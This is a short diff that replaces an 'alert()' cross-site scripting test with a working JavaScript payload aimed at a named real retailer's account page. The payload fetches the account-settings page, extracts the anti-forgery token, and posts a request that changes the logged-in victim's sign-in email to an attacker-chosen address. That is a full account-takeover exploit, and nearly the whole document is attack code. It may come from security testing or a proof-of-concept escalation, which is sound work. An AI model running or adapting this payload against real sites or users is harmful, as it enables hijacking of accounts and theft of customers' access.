@@ -1,1 +1,10 @@
-alert()
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','https://www.next.co.uk/secure/account/MyAccount/UpdateSignInDetails.aspx',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="__RequestVerificationToken" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', 'https://www.next.co.uk/secure/account/MyAccount/UpdateSignInDetails.aspx', true);
+    changeReq.send('__RequestVerificationToken='+token+'&EmailAddress=victim11%40gmail.com&SaveRoute=email&Update=Update')
+};
